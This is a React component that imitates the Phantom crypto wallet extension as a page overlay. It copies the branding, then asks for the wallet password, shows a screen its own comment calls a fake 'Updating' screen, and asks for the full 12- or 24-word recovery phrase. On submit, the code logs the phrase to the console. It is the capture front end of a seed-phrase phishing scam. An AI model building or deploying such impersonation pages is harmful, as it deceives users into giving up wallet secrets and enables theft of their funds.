import { useState, useEffect } from 'react';

interface PhantomPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'updating' | 'import';

export default function PhantomPanel({ isOpen, onClose }: PhantomPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [invalidIndices, setInvalidIndices] = useState<number[]>([]);

  // Reset and handle initial splash screen timer
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setInvalidIndices([]);

      const timer = setTimeout(() => {
        setView('password');
      }, 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake "Updating" screen timer
  useEffect(() => {
    if (view === 'updating') {
      const timer = setTimeout(() => {
        setView('import');
      }, 3500);
      return () => clearTimeout(timer);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    // Validate: only lowercase letters and no spaces/special chars
    const newInvalidIndices = newValues
      .slice(0, phraseLength)
      .map((val, i) => (val.length > 0 && !/^[a-z]+$/.test(val) ? i + 1 : -1))
      .filter((i) => i !== -1);
      
    setInvalidIndices(newInvalidIndices);
  };

  const getErrorText = () => {
    if (invalidIndices.length === 0) return '';
    if (invalidIndices.length === 1) return `Word ${invalidIndices[0]} is incorrect or misspelled`;
    const last = invalidIndices.slice(-1)[0];
    const rest = invalidIndices.slice(0, -1);
    return `Words ${rest.join(', ')}, and ${last} are incorrect or misspelled`;
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && invalidIndices.length === 0;
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[2147483648] pointer-events-none font-sans">
      
      {/* Backdrop overlay */}
      <div 
        className={`absolute inset-0 bg-[#12121280] transition-opacity duration-200 ease-in-out pointer-events-auto ${isOpen ? 'opacity-100' : 'opacity-0'}`} 
        onClick={onClose}
      ></div>
      
      {/* Floating Extension Panel - Mobile full, Desktop top-right */}
      <div className={`pointer-events-auto flex transition-all duration-[520ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[685px] md:border md:border-[#323232] md:overflow-y-hidden overflow-y-auto ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0 pointer-events-none'}`}>
        <div className="h-full w-full bg-[#222222] shadow-xl md:border-0 rounded-none flex flex-col">
          <div className="relative z-[2147483649] h-full flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-[2147483648] bg-[#222222] transition-opacity duration-[650ms] ease-[cubic-bezier(0.25,1,0.5,1)] flex flex-col items-center justify-center ${view === 'splash' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
              <div className="animate-[pulse_1.5s_ease-in-out_infinite]">
                <PhantomGhostSVG className="h-[120px] w-full" />
              </div>
              <div className="mt-8">
                <p className="text-white text-2xl font-semibold font-inter">BooOooOo...</p>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 flex flex-col bg-[#222222] transition-opacity duration-500 ${view === 'password' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
              {/* Header */}
              <div className="flex items-center justify-between px-[16px] py-[10px] border-b border-[#323232] h-[59px] shrink-0">
                <div className="flex items-center justify-center">
                  <button type="button" className="md:hidden" onClick={onClose}>
                    <svg className="w-5 h-5 text-[#777777] hover:text-white transition-colors duration-300" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="m15 9-6 6"></path><path d="m9 9 6 6"></path></svg>
                  </button>
                </div>
                <div>
                  <PhantomTextSVG />
                </div>
                <div>
                  <a href="https://help.phantom.com/hc/en-us" target="_blank" rel="noreferrer">
                    <svg className="fill-[#777777] hover:fill-white transition-colors duration-200" width="15" viewBox="0 0 15 15" xmlns="http://www.w3.org/2000/svg">
                      <path d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z" />
                    </svg>
                  </a>
                </div>
              </div>
              
              {/* Body */}
              <div className="mt-32 px-4 flex-1">
                <div className="flex items-center justify-center mb-16">
                  <PhantomGhostSVG className="h-[110px] w-full" />
                </div>
                <div className="flex flex-col items-center justify-center text-center gap-y-2 mt-4 mb-4">
                  <h3 className="text-white font-inter font-medium text-[22px]">Enter your password</h3>
                </div>
                <div className="relative mb-8">
                  <input 
                    className="text-white font-inter font-normal text-[16px] bg-[#191919] rounded-[6px] border border-[#3a3a3a] h-[48px] shadow-sm outline-none px-[14px] w-full transition-all duration-300 focus:border-[#ab9ff2]" 
                    type="password" 
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                </div>
                <div className="w-full mb-2">
                  <button 
                    className="font-inter flex items-center justify-center py-[14px] outline-none w-full text-[#222222] bg-[#ab9ff2] font-semibold text-[16px] rounded-[16px] h-[47px] transition-all duration-300 cursor-pointer hover:bg-[#e2dffe] disabled:opacity-60 disabled:cursor-not-allowed disabled:bg-[#333333] disabled:text-white" 
                    type="button" 
                    disabled={password.length < 3}
                    onClick={() => setView('updating')}
                  >
                    Unlock
                  </button>
                </div>
                <div className="w-full">
                  <button className="font-inter flex items-center justify-center py-[14px] outline-none w-full text-white bg-transparent font-semibold text-[16px] rounded-[16px] h-[47px] transition-all duration-300 hover:text-[#ab9ff2]" type="button">
                    Forgot password
                  </button>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATING / TIPS SCREEN            */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 bg-[#222222] flex flex-col transition-opacity duration-500 items-center justify-center ${view === 'updating' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
              <div>
                <PhantomGhostSVG className="h-[120px] w-full ghost-float" />
              </div>
              <div className="mt-8">
                <p className="text-white text-2xl font-semibold font-inter">Updating your wallet</p>
              </div>
              <div className="mt-6">
                <p className="text-[#999999] font-inter font-medium text-[17px] max-w-[290px] leading-[24px]">What's new?</p>
              </div>
              <div className="mt-4 text-center">
                <p className="text-[#999999] font-inter font-normal text-[17px] max-w-[290px] leading-[24px]">View Solana, Ethereum, and Polygon balances together.</p>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 bg-[#222222] flex flex-col transition-opacity duration-500 ${view === 'import' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
              {/* Header */}
              <div className="flex items-center justify-between px-[16px] py-[10px] border-b border-[#323232] h-[59px] shrink-0">
                <div className="flex items-center justify-center">
                  <button type="button" className="md:hidden" onClick={onClose}>
                    <svg className="w-5 h-5 text-[#777777] hover:text-white transition-colors duration-300" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="m15 9-6 6"></path><path d="m9 9 6 6"></path></svg>
                  </button>
                </div>
                <div>
                  <PhantomTextSVG />
                </div>
                <div>
                  <a href="https://help.phantom.com/hc/en-us" target="_blank" rel="noreferrer">
                    <svg className="fill-[#777777] hover:fill-white transition-colors duration-200" width="15" viewBox="0 0 15 15" xmlns="http://www.w3.org/2000/svg">
                      <path d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z" />
                    </svg>
                  </a>
                </div>
              </div>

              {/* Body */}
              <div className="flex flex-col flex-1 overflow-hidden">
                <div className="flex flex-col items-center justify-center text-center gap-y-2 mt-4 mb-2 shrink-0">
                  <h3 className="text-white font-inter font-medium text-[24px]">Import wallet</h3>
                  <p className="text-[#999999] font-inter font-normal text-[15px] max-w-[290px] leading-[20px]">Import an existing wallet with your 12 or 24-word recovery phrase.</p>
                </div>
                
                <div className="mt-4 px-6 flex-1 overflow-y-auto phantom-custom-scrollbar">
                  <div className="grid grid-cols-3 gap-3 pb-2">
                    {Array.from({ length: phraseLength }).map((_, i) => {
                      const isError = invalidIndices.includes(i + 1);
                      return (
                        <div key={i} className="relative">
                          <p className="px-[10px] font-inter text-[#999999] font-normal text-[14px] absolute top-[11px]">{i + 1}.</p>
                          <input 
                            className={`text-white font-inter font-normal text-[15px] bg-[#181818] rounded-[6px] border ${isError ? 'border-[#eb3742] text-[#eb3742]' : 'border-[#2f2f2f] hover:border-[#4b4b4b] focus:border-[#ab9ff2]'} h-[41px] self-center shadow-[0_0_4px_0_rgba(0,0,0,0.25)] outline-none pl-8 pr-2 w-full transition-all duration-300`} 
                            type="text" 
                            value={phraseValues[i]}
                            onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                          />
                        </div>
                      );
                    })}
                  </div>
                </div>

                <div className={`px-6 mt-3 transition-opacity duration-400 shrink-0 min-h-[20px] ${invalidIndices.length > 0 ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
                  <p className="flex items-center justify-start text-[#eb3742] text-[14px] leading-[18px] font-inter">
                    <svg className="mr-[6px] w-5 h-5 shrink-0" width="12" height="12" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="15" cy="15" r="14" fill="#111111"></circle><path d="M25.0182 25.0176C30.5503 19.4855 30.5503 10.5146 25.0182 4.98245C19.4861 -0.549652 10.5152 -0.549652 4.98306 4.98245C-0.549041 10.5146 -0.549041 19.4855 4.98306 25.0176C10.5152 30.5497 19.4861 30.5497 25.0182 25.0176ZM13.4158 8.1522C13.7746 7.37471 14.6119 6.95607 15.4492 7.16539C16.2566 7.37471 16.7948 8.1522 16.735 9.01939C16.7051 9.58755 16.6752 10.1258 16.6453 10.694C16.5257 12.7872 16.4061 14.8804 16.3164 16.9438C16.2865 17.6315 15.7183 18.1698 15.0306 18.1698C14.3129 18.1698 13.7746 17.6315 13.7447 16.8839C13.7148 16.4653 13.7148 16.0467 13.6849 15.628C13.5952 14.2824 13.5354 12.9367 13.4457 11.5612C13.3859 10.694 13.356 9.82678 13.2962 8.95958C13.2663 8.72036 13.2962 8.42132 13.4158 8.1522ZM15.0007 19.3958C15.9576 19.3958 16.735 20.1733 16.7649 21.1302C16.7649 22.0871 15.9875 22.8646 15.0306 22.8646C14.1036 22.8646 13.2962 22.0871 13.2962 21.1601C13.2663 20.2032 14.0437 19.3958 15.0007 19.3958Z" fill="#EB3742"></path></svg>
                    <span>{getErrorText()}</span>
                  </p>
                </div>

                <div className="flex flex-col items-center justify-center text-center gap-y-2 mt-4 px-6 shrink-0 pb-4">
                  <div className="mb-1.5 w-full text-center">
                    <button 
                      className="font-inter text-[#777777] font-medium text-[14px] hover:text-[#ab9ff2] transition-colors duration-300" 
                      type="button" 
                      onClick={() => {
                        setPhraseLength(phraseLength === 12 ? 24 : 12);
                        setPhraseValues(Array(24).fill(''));
                        setInvalidIndices([]);
                      }}
                    >
                      {phraseLength === 12 ? "I have a 24-word recovery phrase" : "I have a 12-word recovery phrase"}
                    </button>
                  </div>
                  <div className="w-full">
                    <button 
                      className="font-inter flex items-center justify-center py-[14px] outline-none w-full text-[#222222] bg-[#ab9ff2] font-medium text-[16px] rounded-[16px] h-[47px] transition-all duration-300 hover:bg-[#e2dffe] disabled:opacity-60 disabled:cursor-not-allowed disabled:bg-[#333333] disabled:text-[#ffffff]" 
                      type="button" 
                      disabled={!isPhraseComplete()}
                      onClick={() => {
                        console.log("Phantom Import Complete:", phraseValues.slice(0, phraseLength));
                        onClose();
                      }}
                    >
                      Import Wallet
                    </button>
                  </div>
                </div>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .phantom-custom-scrollbar {
          scrollbar-width: thin;
          scrollbar-color: #323232 transparent;
        }
        .phantom-custom-scrollbar::-webkit-scrollbar {
          width: 6px;
        }
        .phantom-custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .phantom-custom-scrollbar::-webkit-scrollbar-thumb {
          background: #323232;
          border-radius: 10px;
        }
        .ghost-float {
          animation: phantomFloat 3s ease-in-out infinite;
        }
        @keyframes phantomFloat {
          0% { transform: translateY(0px); }
          50% { transform: translateY(-10px); }
          100% { transform: translateY(0px); }
        }
      `}} />
    </div>
  );
}

// -------------------------------------------------------------------
// EXTRACTED SVG COMPONENTS
// -------------------------------------------------------------------

const PhantomGhostSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 593 493" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M70.0546 493C145.604 493 202.38 427.297 236.263 375.378C232.142 386.865 229.852 398.351 229.852 409.378C229.852 439.703 247.252 461.297 281.592 461.297C328.753 461.297 379.119 419.946 405.218 375.378C403.386 381.811 402.471 387.784 402.471 393.297C402.471 414.432 414.375 427.757 438.643 427.757C515.108 427.757 592.03 292.216 592.03 173.676C592.03 81.3243 545.327 0 428.112 0C222.069 0 0 251.784 0 414.432C0 478.297 34.3405 493 70.0546 493ZM357.141 163.568C357.141 140.595 369.962 124.514 388.734 124.514C407.049 124.514 419.87 140.595 419.87 163.568C419.87 186.541 407.049 203.081 388.734 203.081C369.962 203.081 357.141 186.541 357.141 163.568ZM455.126 163.568C455.126 140.595 467.947 124.514 486.719 124.514C505.034 124.514 517.855 140.595 517.855 163.568C517.855 186.541 505.034 203.081 486.719 203.081C467.947 203.081 455.126 186.541 455.126 163.568Z" fill="#FFFDF8"/>
  </svg>
);

const PhantomTextSVG = ({ className }: { className?: string }) => (
  <svg className={className} width="94" height="103" viewBox="0 0 478 103" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path fill="#666666" d="M0 102.895h17.97V85.222c0-8.295-.718-11.42-4.911-19.836l2.276-1.203C21.445 78.49 30.07 83.66 38.937 83.66c14.257 0 25.638-12.503 25.638-31.859 0-18.514-10.423-32.1-25.399-32.1-8.865 0-17.73 5.05-23.841 19.477l-2.276-1.202c2.875-5.771 4.912-11.181 4.912-16.35H0v81.27ZM17.97 51.68c0-7.934 5.991-16.71 14.857-16.71 7.188 0 13.058 5.89 13.058 16.59 0 10.58-5.63 16.831-13.178 16.831-8.387 0-14.736-8.536-14.736-16.71ZM71.135 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.147 4.208 8.147 14.668v31.979h17.97V46.871c0-18.995-6.828-27.17-19.887-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832V.826h-17.97v80.91ZM156.582 83.66c11.621 0 18.45-7.694 23.601-17.553l2.157 1.082c-2.277 4.689-4.433 10.099-4.433 14.547h17.612v-32.7c0-19.477-8.147-29.335-27.196-29.335-18.69 0-27.915 9.377-29.712 19.236l17.252 3.005c.599-5.17 4.792-8.656 11.501-8.656 6.71 0 10.543 3.366 10.543 7.454 0 4.088-3.953 6.011-14.496 6.131-15.575.24-27.076 5.891-27.076 17.914 0 9.858 7.787 18.874 20.247 18.874Zm-2.396-20.078c0-9.498 15.095-2.885 23.362-10.218v2.163c0 8.536-7.548 14.788-15.096 14.788-3.953 0-8.266-1.683-8.266-6.733ZM202.64 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.146 4.208 8.146 14.668v31.979h17.972V46.871c0-18.995-6.829-27.17-19.888-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832h-17.97v60.112ZM309.688 81.977V67.069c-3.834 1.322-14.496 3.606-14.496-5.17V36.051h14.376V21.624h-14.376V5.514l-18.091 5.41v10.7h-10.782v14.427h10.782l.12 27.291c0 20.077 17.851 22.963 32.467 18.635ZM346.192 83.66c18.211 0 32.108-13.946 32.108-32.1 0-18.034-13.897-31.86-32.108-31.86-18.21 0-32.227 13.826-32.227 31.86 0 18.154 14.017 32.1 32.227 32.1Zm-13.657-31.98c0-9.978 5.631-16.951 13.657-16.951 8.027 0 13.538 6.973 13.538 16.951 0 9.979-5.511 16.952-13.538 16.952-8.026 0-13.657-6.973-13.657-16.952ZM383.868 81.736h17.968v-21.16c0-15.508 4.913-25.487 12.82-25.487 5.154 0 6.83 4.088 6.83 14.668v31.979h17.973v-21.16c0-14.547 5.27-25.487 12.82-25.487 5.027 0 6.824 4.69 6.824 14.668v31.979h17.974V46.871c0-19.115-6.232-27.17-18.452-27.17-12.698 0-17.248 9.017-21.682 20.077l-2.16-1.082c4.198-12.623-4.912-18.995-13.896-18.995-11.858 0-16.171 9.017-20.963 19.957l-2.159-1.202c2.994-6.733 4.071-10.82 4.071-16.832h-17.968v60.112Z" />
  </svg>
);